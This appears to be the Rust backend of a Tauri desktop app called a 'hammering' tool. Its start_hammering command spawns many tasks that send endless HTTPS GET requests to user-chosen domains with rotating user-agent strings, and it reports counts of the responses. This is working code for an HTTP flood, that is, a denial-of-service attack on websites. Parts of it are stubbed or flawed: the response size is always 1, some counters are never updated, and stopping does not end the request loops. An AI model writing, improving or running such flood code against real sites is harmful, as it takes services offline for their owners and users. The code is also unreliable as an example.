#![feature(never_type)]
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use lazy_static::lazy_static;
use reqwest::{Client, self, Response};
use reqwest::header::HeaderMap;
use tokio::task::{self, JoinHandle};
use serde_json::json;
use std::time::Duration;
use std::thread::sleep;
use std::sync::{Arc, RwLock}; 
use rand::rngs::StdRng;
use rand::SeedableRng;
use rand::Rng;

lazy_static! {
    pub static ref THREAD_COUNT: Arc<RwLock<u16>> = Arc::new(RwLock::new(0u16));
    pub static ref CLIENT_COUNT: Arc<RwLock<u16>> = Arc::new(RwLock::new(0u16));
    pub static ref SUCCESSFUL_RESPONSES: Arc<RwLock<u32>> = Arc::new(RwLock::new(0u32));
    pub static ref FORBIDDEN_RESPONSES: Arc<RwLock<u32>> = Arc::new(RwLock::new(0u32));
    pub static ref NOT_FOUND_RESPONSES: Arc<RwLock<u32>> = Arc::new(RwLock::new(0u32));
    pub static ref CONNECTION_CLOSED_RESPONSES: Arc<RwLock<u32>> = Arc::new(RwLock::new(0u32));
    pub static ref REQUEST_COUNT: Arc<RwLock<u64>> = Arc::new(RwLock::new(0u64));
    pub static ref RESPONSE_COUNT: Arc<RwLock<u64>> = Arc::new(RwLock::new(0u64));
    pub static ref REQUEST_VOLUME: Arc<RwLock<u128>> = Arc::new(RwLock::new(0u128));
    pub static ref RESPONSE_VOLUME: Arc<RwLock<u128>> = Arc::new(RwLock::new(0u128));
    pub static ref HAMMER: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
}

#[tauri::command]
fn report_metrics() -> String {

    let thread_count_access: Arc<RwLock<u16>> = Arc::clone(&THREAD_COUNT);
    let client_count_access: Arc<RwLock<u16>> = Arc::clone(&CLIENT_COUNT);
    let successful_responses_access: Arc<RwLock<u32>> = Arc::clone(&SUCCESSFUL_RESPONSES);
    let forbidden_responses_access: Arc<RwLock<u32>> = Arc::clone(&FORBIDDEN_RESPONSES);
    let not_found_response_access: Arc<RwLock<u32>> = Arc::clone(&NOT_FOUND_RESPONSES);
    let connection_closed_responses_access: Arc<RwLock<u32>> = Arc::clone(&CONNECTION_CLOSED_RESPONSES);
    let request_count_access: Arc<RwLock<u64>> = Arc::clone(&REQUEST_COUNT);
    let response_count_access: Arc<RwLock<u64>> = Arc::clone(&RESPONSE_COUNT);
    let request_volume_access: Arc<RwLock<u128>> = Arc::clone(&REQUEST_VOLUME);
    let response_volume_access: Arc<RwLock<u128>> = Arc::clone(&RESPONSE_VOLUME);
    let hammer_access: Arc<RwLock<bool>> = Arc::clone(&HAMMER);

    let thread_count: String = thread_count_access.read().unwrap().to_string();
    let client_count: String = client_count_access.read().unwrap().to_string();
    let successful_responses: String = successful_responses_access.read().unwrap().to_string();
    let forbidden_responses: String = forbidden_responses_access.read().unwrap().to_string();
    let not_found_responses: String = not_found_response_access.read().unwrap().to_string();
    let connnection_closed_responses: String = connection_closed_responses_access.read().unwrap().to_string();
    let request_count: String = request_count_access.read().unwrap().to_string();
    let response_count: String = response_count_access.read().unwrap().to_string();
    let request_volume: String = request_volume_access.read().unwrap().to_string();
    let response_volume: String = response_volume_access.read().unwrap().to_string();
    let hammering: String = hammer_access.read().unwrap().to_string();

    let metrics: String = json!({
        "threadCount": thread_count,
        "clientCount": client_count,
        "successfulResponses": successful_responses,
        "forbiddenResponses": forbidden_responses,
        "notFoundResponses": not_found_responses,
        "connectionClosedResponses": connnection_closed_responses,
        "requestCount": request_count,
        "responseCount": response_count,
        "requestVolumne": request_volume,
        "responseVolume": response_volume,
        "hammering": hammering
    }).to_string();

    return metrics

}

#[tauri::command]
async fn start_hammering(targets: Vec<String>, number_of_threads: u8, agent_details: Vec<String>, sleep_duration: u64) -> () {

    //Set HAMMER to true
    let hammer_access: Arc<RwLock<bool>> = Arc::clone(&HAMMER);
    {
        let mut hammer_write: std::sync::RwLockWriteGuard<'_, bool> = hammer_access.write().unwrap();
        *hammer_write = true;
    }

    //Create thread registry 
    let mut handles: Vec<JoinHandle<()>> = Vec::new();

    //Start spawning threads
    for _ in 0..number_of_threads {

        //Copy in the targets and agent_details lists
        let targets_arc: Arc<Vec<String>> = Arc::new(targets.clone());
        let agents_arc: Arc<Vec<String>> = Arc::new(agent_details.clone());

        //Generate a thread
        let handle: JoinHandle<()> = task::spawn(async move {

            //Create access to thread_count, client_count, agent_detail, and target variables for thread to claim
            let agents_access: Arc<Vec<String>> = Arc::clone(&agents_arc);
            let targets_access: Arc<Vec<String>> = Arc::clone(&targets_arc);
            let thread_count_access: Arc<RwLock<u16>> = Arc::clone(&THREAD_COUNT);

            //Iterate thread count
            let this_thread_num: u16;

            {
                let mut thread_count_data: std::sync::RwLockWriteGuard<u16> = match thread_count_access.write(){
                    Ok(data) => data,
                    Err(poisoned) => {println!("thread_count_data is poisoned, overwriting"); poisoned.into_inner()}
                };
                println!("Spawned thread {:?}", (*thread_count_data + 1));
                *thread_count_data += 1;
                this_thread_num = thread_count_data.clone();
            }

            //Create the rng
            let mut rng: StdRng = StdRng::from_entropy();

            loop {

                // Choose agent profile
                let agent_index: usize = rng.gen_range(0..agents_access.len());
                let agent_details: String = agents_access[agent_index].clone();

                // Choose target
                let target_index: usize = rng.gen_range(0..targets_access.len());
                let target_domain: String = targets_access[target_index].clone();
                let target_url: String = format!("https://{target_domain}");

                let res: Result<(), reqwest::Error> = make_request(this_thread_num.clone(), target_url.clone(), agent_details.clone()).await;
        
                match res {
                    Err(_err) => println!("Thread {:?}: An existing connection forcibly closed by host at {:?}", this_thread_num, target_url),
                    _ => (),
                }

                // Sleep to limit throughput
                tokio::time::sleep(Duration::from_millis(sleep_duration)).await;
            }

        });     

        handles.push(handle);  
    }
    
    //Check for HAMMER switch, kill all threads and exit function 
    loop {
        {
            let hammer_read: std::sync::RwLockReadGuard<'_, bool> = hammer_access.read().unwrap();
            if !*hammer_read {
                return ()
            };
        }
        sleep(Duration::from_millis(500));
    }

}

async fn make_request(thread_num: u16, target_url: String, agent_details: String) -> Result<(), reqwest::Error> {

    //assemble client
    let mut headers: HeaderMap = reqwest::header::HeaderMap::new();
    headers.insert(reqwest::header::USER_AGENT, reqwest::header::HeaderValue::from_str(&agent_details).unwrap());
    let client: Client = reqwest::Client::builder()
        .default_headers(headers)
        .build()?;

    //make request
    let res: Response = client.get(&target_url).send().await?;

    let scoped_response: &reqwest::Response = &res;
    let response_status: reqwest::StatusCode = scoped_response.status();
    let this_response_size: u128 = calculate_response_size(scoped_response);

    if scoped_response.status().is_success() {

        let _successful_responses_access: Arc<RwLock<u32>> = Arc::clone(&SUCCESSFUL_RESPONSES);
        let _forbidden_responses_access: Arc<RwLock<u32>> = Arc::clone(&FORBIDDEN_RESPONSES);
        let _not_found_response_access: Arc<RwLock<u32>> = Arc::clone(&NOT_FOUND_RESPONSES);
        let _request_count_access: Arc<RwLock<u64>> = Arc::clone(&REQUEST_COUNT);
        let _response_count_access: Arc<RwLock<u64>> = Arc::clone(&RESPONSE_COUNT);
        let _request_volume_access: Arc<RwLock<u128>> = Arc::clone(&REQUEST_VOLUME);

        {
            let response_volume_access: Arc<RwLock<u128>> = Arc::clone(&RESPONSE_VOLUME);
            let mut response_volume_ptr = response_volume_access.write().unwrap();
            *response_volume_ptr += this_response_size;
        }

        println!("Thread {}: Successful request to {} received status: {} (Response Size: {})", thread_num, target_url, response_status, this_response_size);
    } else {
        let connection_closed_responses_access: Arc<RwLock<u32>> = Arc::clone(&CONNECTION_CLOSED_RESPONSES);
        let mut connection_closed_responses_ptr: std::sync::RwLockWriteGuard<'_, u32> = connection_closed_responses_access.write().unwrap();
        *connection_closed_responses_ptr += 1;
        println!("Thread {}: Unsuccessful request to {} received status: {} (Response Size: {})", thread_num, target_url, response_status, this_response_size);
    }

    Ok(())
}

#[tauri::command]
fn stop_hammering() -> String {
    
    let hammer_access: Arc<RwLock<bool>> = Arc::clone(&HAMMER);
    let mut hammer: std::sync::RwLockWriteGuard<'_, bool> = hammer_access.write().unwrap();
    
    {
        *hammer = false;
    }

    return "Hammering stopped.".to_string();
}

#[tauri::command]
fn test() -> String {
    return "hello from Rust binary :)".to_string();
}



/*fn calculate_request_size(url: String, _agent_details: String) -> u128 {
    let method: &str = "GET";
    let version: &str = "HTTP/1.1";
    let _request_line_size: usize = format!("{} {} {}", method, url, version).len() + 2; // +2 for "\r\n"
    let _host: &str = "null";
    return 1
}*/

fn calculate_response_size(_response: &reqwest::Response) -> u128 {
    return 1
}

fn main() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![start_hammering,
            stop_hammering,
            report_metrics,
            test])
        .run(tauri::generate_context!())
        .expect("error launching tauri :(");
}

